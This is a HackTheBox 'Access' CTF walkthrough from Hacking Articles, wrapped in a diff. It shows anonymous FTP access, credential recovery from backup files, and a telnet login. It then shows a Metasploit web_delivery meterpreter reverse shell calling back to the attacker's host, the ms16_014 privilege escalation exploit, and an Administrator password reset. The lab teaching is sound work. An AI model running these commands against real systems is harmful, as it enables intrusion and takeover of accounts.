@@ -1,0 +1,100 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Access Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-access-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-03T17:16:39+00:00">March 3, 2019</time><time class="updated" datetime="2025-06-29T13:32:45+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Access”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Easy</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Access is 10.10.10.98.</span></p>
+<h3><span style="color: #800000;">Penetrating Methodologies</span></h3>
+<ul>
+<li><span style="color: #000000;">Network scanning (nmap).</span></li>
+<li><span style="color: #000000;">Logging in FTP using Anonymous Login.</span></li>
+<li><span style="color: #000000;">Using strings to read contents of </span>the .mdb<span style="color: #000000;"> file.</span></li>
+<li><span style="color: #000000;">Unzipping Zip file using 7z.</span></li>
+<li><span style="color: #000000;">Using </span>readpst<span style="color: #000000;"> to read the contents of </span>the .pst<span style="color: #000000;"> file.</span></li>
+<li><span style="color: #000000;">Finding Login Credentials</span></li>
+<li><span style="color: #000000;">Logging into Telnet.</span></li>
+<li><span style="color: #000000;">Finding </span>the first<span style="color: #000000;"> flag user.txt</span></li>
+<li><span style="color: #000000;">Using </span>web delivery<span style="color: #000000;"> module to create </span>PowerShell<span style="color: #000000;"> code.</span></li>
+<li><span style="color: #000000;">Getting Meterpreter.</span></li>
+<li><span style="color: #000000;">Using exploit suggester of Metasploit.</span></li>
+<li><span style="color: #000000;">Getting Root Access.</span></li>
+<li><span style="color: #000000;">Changing </span>the Administrator<span style="color: #000000;"> password using net user.</span></li>
+<li><span style="color: #000000;">Reading Our Final flag root.txt</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<p><span style="color: #000000;">Let’s start off with scanning the network to find our target.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A 10.10.10.98</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-SGp80pJw4VQ/XHv-7lIznGI/AAAAAAAAdOg/rfARN604SnI34xHCgsM6RZMEoRqex-t3QCLcBGAs/s1600/1.png"/></span></p>
+<p>The first<span style="color: #000000;"> thing that got our attention is that we have anonymous access to the <strong>ftp</strong><strong> server</strong>. Let’s </span>login<span style="color: #000000;"> and see what we find.</span></p>
+<p>After successfully logging into <strong>FTP server</strong>, we have enumerated directories from where we have downloaded two files <strong>Access Control.zip</strong> and <strong>backup.mdb</strong>.<span style="color: #000000;"> They might come in handy later on.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.10.98</pre>
+<p><span style="color: #000000;">When we tried to unzip the zip file found out that it was password protected. So we tried to open the <strong>backup.mdb</strong> file and found a password to the zip file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings backup.mdb | grep access</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-2olzo_J8uOM/XHv-9_QWQYI/AAAAAAAAdPA/kWxzcEQeBxAQ7wFS6aVEyEuqvBhWpqarwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Then, once we have obtained the password for the <strong>Access Control.zip</strong>. Time to unzip it. After unzipping we saw its a <strong>.pst</strong> which is a <strong>Microsoft Exchange Format</strong> for mailboxes. Using <strong>readpst</strong> it converted the file into <strong>the .mbox format</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">7z x Access\ Control.zip
+readpst 'Access Control.pst'</pre>
+<p><span style="color: #000000;">Let’s read the contents of the <strong>Access Control.mbox.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">less 'Access Control.mbox'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kRqjg78p6tM/XHv--dKqHYI/AAAAAAAAdPE/lxLAkJqFIB4ty5VClW4jAlWr0x9izqmOQCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">After reading the contents, we saw that </span>user<span style="color: #000000;"> credentials that surely going to help us to move ahead.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username- security
+Password- 4Cc3ssC0ntr0ller</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-i-TWZVLTYxs/XHv--7sJbNI/AAAAAAAAdPI/SvfL0XIp1A0ic03PUHo4JwgeTOVT-K0GACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Then, let’s login into telnet using our new credentials. After enumerating through directories, we have found our first flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet 10.10.10.98
+dir
+cd Desktop
+type user.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-Zw87Va7K-z4/XHv-_NKEX2I/AAAAAAAAdPM/dJBHwrJuEds0wgZs8qOXsGCHsJ6RBARrQCLcBGAs/s1600/8.png"/></strong></span></p>
+<p><span style="color: #000000;">Therefore, let’s create a </span>shellcode<span style="color: #000000;"> generated via the web delivery module of Metasploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
+set target 2
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.6
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UZh-v8ylJ0E/XHv-_CKNV_I/AAAAAAAAdPQ/JRuCEm-z3I4BXmz1ImMwHEMyJ3YGdMZ2wCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Now we will execute the PowerShell code generated via the web delivery module.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jEZuSH0CbuQ/XHv-77duNSI/AAAAAAAAdOk/hrMdZyRqxzERDmK9q_-HgfxHyNvFsQr5ACLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Finally, we have successfully got the meterpreter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getuid
+getsystem
+sysinfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3gOyXBpZznA/XHv-7xH1w-I/AAAAAAAAdOo/96KySZo-lr4pZlfGTzWbNJoA3DnZyOMKQCLcBGAs/s1600/11.1.png"/></span></p>
+<p><span style="color: #000000;">Then</span><span style="color: #000000;">, we have used exploit suggester which has </span>given<span style="color: #000000;"> us all the possible exploits for the operating system of the Victims system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/recon/local_exploit_suggester
+set session 1
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-835xsBoFIaI/XHv-8lpu-1I/AAAAAAAAdOs/SjvHahkkYQkaO9LuordbEP07UckuVm8EACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">Using the exploit <strong>ms16_014_wmirecv_notif </strong>of </span>Metasploit<span style="color: #000000;">.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/local/ms16_014_wmi_recv_notif
+set lhost 10.10.14.6
+set session 1
+set lport 1234
+exploit</pre>
+<h5><span style="color: #000000;">oh yeah! </span></h5>
+<p><span style="color: #000000;">We have got the root access.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-m1QAtdGrm7Y/XHv-8uYPyEI/AAAAAAAAdOw/kix0do8deDsIQBORFpaiQocozmYhBv4rgCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Then, we changed the password for <strong>Administrator </strong>because we can </span>use<span style="color: #000000;"> it to </span>login<span style="color: #000000;"> via <strong>telnet.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user
+net user Administrator Ignite@123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6FHjYRDFGT4/XHv-8woxgNI/AAAAAAAAdO0/v92leJ3y1GMaH6p6_b5FG5mgbegTlEMdwCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Here we successfully logged in via <strong>Telnet</strong> and found our <strong>final flag.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet 10.10.10.98
+login: administrator
+password: Ignite@123
+cd Desktop
+type root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-qXJTrrsWGVI/XHv-9YeVidI/AAAAAAAAdO4/icT4M3ol4hIEzZK-MuZh55gjVXzxYnt_ACLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 2 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <strong><u><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></u></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
